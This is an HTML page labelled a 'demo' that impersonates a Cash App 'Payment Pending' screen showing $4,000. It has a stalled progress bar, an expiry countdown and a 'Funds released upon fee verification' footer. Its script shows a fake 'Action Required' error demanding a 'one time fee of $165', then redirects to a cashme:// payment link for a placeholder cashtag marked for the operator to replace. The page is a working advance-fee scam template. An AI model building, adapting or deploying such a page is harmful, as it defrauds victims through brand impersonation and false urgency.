<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Payment Status Demo</title>

  <style>
    /* Reset and Base Styles */
    *{ margin:0; padding:0; box-sizing:border-box; font-family:Arial, Helvetica, sans-serif; }
    body{ min-height:100vh; background:#080b0d; color:#fff; display:flex; justify-content:center; padding:24px 14px; overflow-x: hidden; }
    .page{ width:100%; max-width:430px; min-height:100vh; padding:8px 8px 30px; }

    /* Header & Branding */
    .top{ display:flex; justify-content:space-between; align-items:center; margin-bottom:34px; }
    .brand{ display:flex; align-items:center; gap:14px; font-size:24px; font-weight:800; }
    .brand-logo{ width:46px; height:46px; border-radius:13px; object-fit:cover; }
    .secure{ color:#59d76d; font-size:14px; font-weight:600; }

    /* Main UI Elements */
    .clock{ width:92px; height:92px; border-radius:50%; margin:0 auto 24px; background:rgba(67,220,92,0.08); border:1px solid rgba(67,220,92,0.25); display:flex; align-items:center; justify-content:center; box-shadow:0 0 25px rgba(42,221,81,0.12); font-size:42px; color:#55e56f; }
    .title{ text-align:center; font-size:33px; font-weight:800; margin-bottom:14px; }
    .subtitle{ text-align:center; color:#c7c7c7; font-size:19px; line-height:1.45; margin-bottom:30px; }

    /* Card & Amount */
    .card{ border:1px solid rgba(255,255,255,0.15); background:rgba(255,255,255,0.035); border-radius:16px; padding:20px 18px; margin-bottom:28px; backdrop-filter:blur(10px); }
    .amount-top{ display:flex; justify-content:space-between; color:#d0d0d0; font-size:19px; margin-bottom:18px; }
    .pill{ background:rgba(77,218,99,0.18); color:#62e878; padding:5px 10px; border-radius:12px; font-size:14px; font-weight:700; }
    .amount{ text-align:center; color:#58e76e; font-size:46px; font-weight:900; margin-bottom:10px; }
    .txn{ text-align:center; color:#bdbdbd; font-size:18px; margin-top:6px; }

    /* Progress & Status */
    .status{ text-align:center; margin-bottom:24px; }
    .status h3{ font-size:21px; margin-bottom:10px; }
    .progress-row{ display:flex; align-items:center; gap:14px; margin-bottom:32px; }
    .progress-bg{ flex:1; height:10px; background:#1b2025; border-radius:20px; overflow:hidden; }
    .progress-fill{ width:0%; height:100%; background:linear-gradient(90deg,#29d84e,#6df47e); border-radius:20px; transition:width .2s ease; }
    .percent{ color:#62e878; font-size:18px; min-width:42px; font-weight:700; }

    /* Buttons & Footer */
    .btn{ width:100%; border:none; border-radius:999px; padding:20px; font-size:20px; font-weight:800; background:linear-gradient(135deg,#45e765,#63ea75); color:#06100a; cursor:pointer; margin-bottom:22px; transition:.25s; position: relative; overflow: hidden; }
    .btn:disabled{ opacity: 0.8; cursor: not-allowed; }
    .countdown{ text-align:center; color:#d4d4d4; font-size:17px; margin-bottom:24px; }
    .countdown span{ color:#58e76e; font-weight:800; }
    .footer{ text-align:center; color:#8f8f8f; font-size:15px; line-height:1.8; }

    /* --- OVERLAY STYLES --- */
    #statusOverlay {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(8, 11, 13, 0.98);
      z-index: 10000;
      justify-content: center; align-items: center;
      flex-direction: column; padding: 30px; text-align: center;
      backdrop-filter: blur(15px);
    }

    .loader {
      width: 60px; height: 60px;
      border: 5px solid rgba(89, 215, 109, 0.2);
      border-top: 5px solid #59d76d;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    .error-icon { font-size: 60px; color: #ff5f5f; margin-bottom: 20px; display: none; }
    .overlay-title { font-size: 24px; font-weight: 800; margin-bottom: 15px; }
    .overlay-msg { font-size: 18px; color: #cfcfcf; line-height: 1.5; }
    .highlight { color: #ff5f5f; font-weight: bold; }
  </style>
</head>

<body>

  <div id="statusOverlay">
    <div id="loader" class="loader"></div>
    <div id="errorIcon" class="error-icon">⚠️</div>
    <h2 id="overlayTitle" class="overlay-title">Processing Request...</h2>
    <p id="overlayMsg" class="overlay-msg">Connecting to secure gateway</p>
  </div>

  <div class="page">
    <div class="top">
      <div class="brand">
        <img src="cashappgreen.png" alt="Logo" class="brand-logo">
        <span>Cashapp</span>
      </div>
      <div class="secure">Secure Connection</div>
    </div>

    <div class="clock">🕒</div>
    <h1 class="title">Payment Pending</h1>
    <p class="subtitle">we're verifying your payment.</p>

    <div class="card">
      <div class="amount-top"><span>Amount</span><span class="pill">USD</span></div>
      <div class="amount">$4,000.00</div>
      <div class="txn">Transaction ID: DEMO-9082-2482</div>
    </div>

    <div class="progress-row">
      <div class="progress-bg"><div class="progress-fill" id="progressFill"></div></div>
      <div class="percent" id="percentText">0%</div>
    </div>

    <button class="btn" id="openBtn">Open in Cashapp</button>

    <div class="countdown">⏱ Expires in <span id="timer">30:00</span></div>
    
    <div class="footer">
      🔒 Secure encryption active <br>
      <strong>Funds released upon fee verification</strong>
    </div>
  </div>

  <script>
    // --- Existing UI Logic ---
    const progressFill = document.getElementById("progressFill");
    const percentText = document.getElementById("percentText");
    let progress = 0;
    const progressInt = setInterval(() => {
      if (progress >= 90) { clearInterval(progressInt); return; }
      progress++; progressFill.style.width = progress + "%"; percentText.textContent = progress + "%";
    }, 50);

    const timer = document.getElementById("timer");
    let timeLeft = 1800;
    setInterval(() => {
      let m = Math.floor(timeLeft / 60); let s = timeLeft % 60;
      timer.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
      if (timeLeft > 0) timeLeft--;
    }, 1000);

    // --- NEW FLOW LOGIC ---
    const openBtn = document.getElementById("openBtn");
    const overlay = document.getElementById("statusOverlay");
    const loader = document.getElementById("loader");
    const errorIcon = document.getElementById("errorIcon");
    const oTitle = document.getElementById("overlayTitle");
    const oMsg = document.getElementById("overlayMsg");

    openBtn.addEventListener("click", () => {
      // 1. Start Processing (2 Seconds)
      overlay.style.display = "flex";
      
      setTimeout(() => {
        // 2. Switch to Error State (3 Seconds)
        loader.style.display = "none";
        errorIcon.style.display = "block";
        oTitle.innerText = "Action Required";
        oTitle.style.color = "#ff5f5f";
        oMsg.innerHTML = `Blockchain deposit detected.<br><span class="highlight">One time fee of $165 is required.</span><br><br>Redirecting to Cashapp...`;

        // 3. Final Redirect after 3 seconds of showing error
        setTimeout(() => {
          const cashtag = "YourCashtag"; // Replace with your tag
          window.location.href = `cashme://cash.app/$${cashtag}/165`;
          
          // Optional: Hide overlay if they come back to the browser
          setTimeout(() => { overlay.style.display = "none"; loader.style.display = "block"; errorIcon.style.display="none"; oTitle.innerText="Processing..."; }, 2000);
        }, 3000);

      }, 2000);
    });
  </script>
</body>
</html>
